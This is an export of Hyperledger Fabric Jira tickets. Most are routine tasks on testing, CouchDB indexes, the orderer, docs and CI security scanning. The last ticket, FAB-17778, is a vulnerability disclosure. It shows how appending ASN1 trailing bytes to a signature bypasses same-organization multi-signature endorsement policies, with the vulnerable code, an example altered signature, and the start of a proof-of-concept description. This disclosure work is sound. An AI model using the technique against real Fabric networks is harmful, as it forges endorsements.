 * The query function should simply query based on the key.",,btl5037,Pritam 12,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b2b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Pritam 12,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create CouchDB Index Definition Files,FAB-17766,44827,44825,Sub-task,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,dongming,btl5037,btl5037,16/Apr/20 12:34 PM,21/May/20 2:41 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The state fork recreation will require two index definition files:
 * The first indexes on both fields contained in the key
 * The second indexes on one field contained in the key

These files will be alternated during the chaincode upgrade instantiate and upgrade processes to guarantee the CouchDB indexes are constantly being rebuilt.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b2j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create a Client For Driving JSON-based CouchDB Queries,FAB-17767,44828,44825,Sub-task,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,dongming,btl5037,btl5037,16/Apr/20 12:56 PM,21/May/20 2:41 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"We will need some client we can use to drive a second workload against the CouchDB database.

This client should run continuous JSON queries on the CouchDB endpoint with a filter on both field1 and field2. Filtering on both fields will ensure the queries are always hitting an index regardless of the which field or fields are currently indexed.

This client workload will be driven for the entire duration of the test.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b2r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create AZP Pipeline Definition for Driving State Fork Tests,FAB-17768,44829,44825,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,16/Apr/20 3:10 PM,11/Jan/21 2:38 AM,28/Oct/23 3:09 AM,11/Jan/21 2:38 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Now that we have the chaincode, index definitions and JSON query driver, we can put all the pieces together and create a pipeline for driving this test.

The pipeline should perform the following stages and jobs, we will run them on static nodes so we can control the environment:
 * The first stage should stand up the network and generate the artifacts on Node A

 * 
 ** Since we need to test v1.1.x Fabric, unless we can easily add support for this to the Operator tool (consult with Surya on the possibility of doing this), we will need to use the legacy Network Launcher tool for standing up the network.
 ** Use 10 channels and 2 peers, the rest of the topology should be irrelevant.
 ** Docker supports limiting CPU and Memory, use 500 millicores and 500MB memory, we want to starve the peers resources
 ** Both peers should be joined to all channels and use legacy lifecycle
 ** Install chaincode with single field indexes on both peers with 2of2 endorsement policy
 ** Instantiate Chaincode on all channels
 ** Publish the artifacts needed by other jobs to submit transactions
 ** Start continuously upgrading the chaincode on each channel, one after the other
 *** We can use the same chaincode and just increment the version number. But after each loop over each of the all 10 channels we swap what index file we are using. So we are alternating between single field indexes and double field indexes. This process continues indefinitely. If the chaincode upgrade fails check the failure message for an MVCC conflict, if the fork occurred the upgrade will fail and this error returned.
 *** If the fork occurs we should kill the process but leave the network running and exit the pipeline
 * In a separate stage on Node B
 ** Download the artifacts 
 ** Run Invokes against the network submitting transactions to both peers for endorsement
 * In a separate stage on Node C
 ** Use the JSON query client to constantly query CouchDB using the public endpoint, queries should run one after another

We need to figure out way to tell Node B and Node C they can shut down gracefully when a fork occurs and clean up the artifacts on Node B and Node C. Otherwise the test should have a 30 minute timeout and should clean up all of its artifacts on all nodes at the end of the pipeline",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b2z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Security Code Scanning for Fabric Code ,FAB-17770,44833,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,ashutosh_kumar,ashutosh_kumar,17/Apr/20 3:21 AM,15/Apr/21 6:37 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ci,,,,,,,,,0,,,,,,"Security code scanning as CI/CD non-voting task of the Fabric Code base was there in prior releases , which has been removed.

In consonance with industry wide doctrine of Secure Development Practice , I propose this to be introduced back to CI/CD pipeline. Following are suggestions :
 # It should run weekly , preferably Sunday night , as CI/CD or Cron job.
 # If it is being decided to run as part of CI/CD pipeline , the job should be non-voting as the scan tends to produce large amount of false positive results which makes CI/CD pipeline to fail.
 # Scan results should be emailed to component leads and [~ashutosh_kumar] every Sunday night/Monday morning , or whatever time and frequency deem appropriate.
 # [~ashutosh_kumar] and Component leads will analyze scan results and create Jira issue , if the scan result found to be valid.

Following tools were used :
 *   Gosec - For Fabric and Fabric CA
 * npm audit - for node dependency check
 * OWASP Dependency Checker - For java dependency check.

[~btl5037], please add specifics for current scans that are run as part of CI/CD pipeline. Also, suggestions are welcome for good open source security code scan tool for Node js and Java.

 

 ",,ashutosh_kumar,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8n",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ashutosh_kumar,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ensure peer panic does not occur when the index path is wrong,FAB-17771,44839,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,18/Apr/20 2:40 PM,28/Apr/20 12:22 PM,28/Oct/23 3:09 AM,28/Apr/20 12:22 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"Address the following comments made in https://github.com/hyperledger/fabric/pull/1080

#     Move the constants related to new function, just above the function.
#     Though, not introduced in the PR but just noticed that array element access without checking lengths. A wrong input could cause panic. I recall that you mentioned that you had added that check but not included finally. But, it would be good to check for safety against a bad input.
",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b4r:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rename TestPvtStoreAheadOfBlockStore(),FAB-17772,44840,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,18/Apr/20 2:47 PM,18/Apr/20 2:47 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"address the following review comment

Earlier, these tests were in a separate package and the scope of that package was clear, i.e., maintaining consistency between ledger storage and pvt data store (exactly, what you have described above). So, a meaning of a crash mimic is clear once you are in that package.
Now, we chose to move that code here in the kvledger package. The kvldegder package deals with much more coordination between many components. mimic crash could mean that ""is this test mimicking a crash after writing to both blockstore and pvtdata store, but short of committing to statedb?"".
That's what I meant that ""TestPvtStoreAheadOfBlockStore"" name does not convey what is the state of other stores and hence I made the comment that - ""The tests that are moved here still have the flavor of testing of commits between the two store only. After some time, we may forget the scope of these tests and I guess that it would make sense to either have them in a separate test file or renaming the tests to makes the scope clear."" But this is not something that should hold this PR from merging. This can be fixed later in a separate PR as well.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b4z:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Commercial paper tutorial incorrectly mentions 5 docker containers,FAB-17773,44845,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Lowest,,anuragjha,anuragjha,anuragjha,20/Apr/20 10:47 PM,20/Apr/20 10:47 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,"docs,",,,,,"Documentations mentions that 5 docker containers will get listed, instead, it should mention 7 containers. 2 missing are org1 and org2 containers.

On this webpage: [https://hyperledger-fabric.readthedocs.io/en/release-2.0/tutorial/commercial_paper.html]",,anuragjha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Apr/20 10:43 PM;anuragjha;7 container instead of 5.png;https://jira.hyperledger.org/secure/attachment/18223/7+container+instead+of+5.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b5v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),anuragjha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
It should be possible to restart the Raft orderer without having to provide the genesis block again,FAB-17774,44847,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,dereckluo,siddjain,siddjain,21/Apr/20 2:22 AM,02/May/20 6:34 AM,28/Oct/23 3:09 AM,02/May/20 6:34 AM,v2.0.1,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ipm,Raft,,,,"the genesis block is needed to bootstrap an orderer. But there should be no need for it when *restarting* an already bootstrapped orderer. the raft orderer will however give an error if you try to restart it without providing the genesis block again.

refer: [https://lists.hyperledger.org/g/fabric/message/8137]",,dereckluo,nao,siddjain,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzc",,,,Unset,Unset,,"restart raft orderer without providing the genesis block again.

",,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,nao,siddjain,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Apr/20 4:15 AM;siddjain;in an attempt to be precise i have called out the raft orderer in the bug title and description but that is not to say the problem is not there with other modes as well. i haven't tested solo and kafka for this issue.;;;","30/Apr/20 4:12 AM;dereckluo;https://github.com/hyperledger/fabric/pull/1197;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update pkg/configtx tests that don't use New() to create the ConfigTx,FAB-17775,44849,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,21/Apr/20 4:48 AM,23/Apr/20 6:06 AM,28/Oct/23 3:09 AM,23/Apr/20 6:06 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"Since the implementation of New() to create a ConfigTx, we should do a walkthrough of all the tests to ensure we're using it and not directly creating the struct via: 			

{code:go}
c := &ConfigTx{
	original: config,
	updated:  config,
}
{code}

This will ensure we're testing the expected functionality as expected. For example, I noticed this when trying to understand the expected functionality of the AnchorPeers() getter function that the original config was being updated when adding an anchor peer, which I did not expect. 


",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxm",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pkg/configtx AnchorPeers() should not return an error when no anchor peers defined,FAB-17776,44850,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,22/Apr/20 12:19 AM,22/Apr/20 4:06 AM,28/Oct/23 3:10 AM,22/Apr/20 4:06 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxl",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create settings.yml for all repos using current settings,FAB-17777,44854,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ryjones,ryjones,ryjones,22/Apr/20 3:51 AM,12/Jun/20 12:29 AM,28/Oct/23 3:10 AM,23/Apr/20 2:16 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Create a basic settings.yml to drive probot:

https://probot.github.io/apps/settings/

this will allow people to make changes to repo settings; it will also make some settings visible to people without admin access.",,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfr:",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ryjones,,,,,,,,,,,,,,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,0.1.x,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,main,dependabot/bundler/docs/commonmarker-0.23.9,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dev,release-2.3,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-2.2,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,AA,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/go_modules/test/performance/golang.org/x/net-0.7.0,main-emeritius,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/google.golang.org/grpc-1.54.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,github-settings,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,purge-pd,dependabot/go_modules/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/go_modules/github.com/prometheus/client_golang-1.11.1,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/github.com/golang/protobuf-1.5.3,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,mergify/bp/release-2.2/pr-4374,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,master,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,mergify/bp/release-2.5/pr-3782,correct-nodeenv-version,mergify/bp/release-2.4/pr-3646,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
De-Deduplication by exploiting lenient ASN1 Unmarshaling,FAB-17778,44855,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,22/Apr/20 5:25 AM,15/May/20 9:11 PM,28/Oct/23 3:10 AM,27/Apr/20 5:53 PM,v1.4.6,v2.0.0,v2.1.0,,,,,,,v1.4.7,v2.0.2,v2.1.1,v2.2.0,fabric-crypto,,,,,,,,,0,,,,,,"h2. *Executive summary:*

As we know, Fabric policies usually span multiple organizations.

However, Fabric also supports policies that require a threshold of signatures from the same organization, like- _NoutOf(K, Org1MSP, Org1MSP, ... Org1MSP)_.

Turns out... these are completely broken - it is easy for an owner of a private key of Org1MSP to bypass any threshold of *K>1* signature requirements by altering its identity to the point it successfully impersonates K different identities of the same organization.

There is a mechanism in place that is supposed to counter this, which is a de-duplication of identities.

This mechanism fails to catch the duplication because BCCSP (incorrectly) assumes that a valid ECDSA signature (marshaled with ASN1) contains exactly the required amount of bytes, and - more specifically, doesn't contain trailing bytes.
h2.  

*Technical details for geeks:*

As you all know, x509 based identities are composed of an MSP ID and an x509 PEM encoded certificate.

An x509 certificate has its CA signature on it (ECDSA signature), thus it is part of the MSP identity.

Even though Fabric copes with dual representations of high and low *S* value by canonizing every *S* to the low part of the curve order, 
 Fabric fails to detect cases where the CA signature has trailing ASN1 junk (as long as the junk was produced with the ASN1 library).

More specifically, if we take an x509 based identity and append some junk to the end of its ASN1 encoding of ECDSA signature, Fabric will unmarshal the ASN1 bytes while ignoring the trailing junk bytes if the signature is +*already*+ in the low *S*.

If it's in the upper half of the curve order, Fabric returns a self marshaled ASN1 signature so there is no problem.

Let's look at the function that converts signatures to low S:
{code:java}
func SignatureToLowS(k *ecdsa.PublicKey, signature []byte) ([]byte, error) {
   r, s, err := UnmarshalECDSASignature(signature)
   if err != nil {
      return nil, err
   }

   s, modified, err := ToLowS(k, s)
   if err != nil {
      return nil, err
   }

   if modified {
      return MarshalECDSASignature(r, s)
   }

   return signature, nil
}
{code}
First we can see, that if the signature is already in the low *S* form, it will not change it and return it as is (end of the function).

This is +exactly where the weakness lies+, because the code doesn't always re-construct the ASN1 structure of the ECDSA signature regardless of whether it is low *S* or not low *S*.

Let's look at it again after adding some prints:
{code:java}
func SignatureToLowS(k *ecdsa.PublicKey, signature []byte) ([]byte, error) {
   r, s, err := UnmarshalECDSASignature(signature)
   if err != nil {
      return nil, err
   }

   // -------------- BEGIN YACOV ADDED THIS ------------
   x, err := MarshalECDSASignature(r,s)
   if err != nil {
      panic(err)
   }

   fmt.Fprintf(os.Stderr, "">>> we got input of %s but we really should have got %s\n"",  hex.EncodeToString(signature), hex.EncodeToString(x))

   // --------------END YACOV ADDED THIS ---------------
   
   s, modified, err := ToLowS(k, s)
   if err != nil {
      return nil, err
   }

   if modified {
      return MarshalECDSASignature(r, s)
   }

   return signature, nil
}

{code}
The function, in my integration test POC prints:
{code:java}
[e][Org2.peer0] >>> we got input of 304702202c5776a13174e8d59ae7ed1b83da4a6bc86094334901905d3e2335a8d4727bd502204217a33e19e6573be4634f14fcec3ce9c4d4133f2c8c41c734a33b93f0f0ded102012a but we really should have got 304402202c5776a13174e8d59ae7ed1b83da4a6bc86094334901905d3e2335a8d4727bd502204217a33e19e6573be4634f14fcec3ce9c4d4133f2c8c41c734a33b93f0f0ded1
{code}
Observe that the function input {color:#0747a6}304702202c5776a13174e8d59ae7ed1b83da4a6bc86094334901905d3e2335a8d4727bd502204217a33e19e6573be4634f14fcec3ce9c4d4133f2c8c41c734a33b93f0f0ded1{color}{color:#de350b}02012a{color} but which is exactly like a canonical representation of an (R,S) ECDSA in ASN1 format, but it has trailing junk of {color:#de350b}02012a{color}.

It's worth to mention, that the x509 verification will *reject* arbitrary trailing bytes because the ASN1 unmarshaling call would return these trailing bytes and the identity verification would fail with an error of: ""x509: trailing data after ECDSA parameters"" as can be seen [here|https://golang.org/src/crypto/x509/x509.go#L1049].

This _almost_ made me give up on attempting to perform the attack and I thought it is impossible for a few minutes.

In a last attempt I tried using the ASN1 library itself to append some data, and then discovered that unlike in the previous case, it just silently skips the trailing bytes as can be seen [here|https://play.golang.org/p/Kry3M6py3-T].

h2. *Exploiting the lenient behavior to sidestep policy identity deduplication:*

I went and made an integration test that uses a chaincode with endorsement policy of _OutOf (6, 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member')_

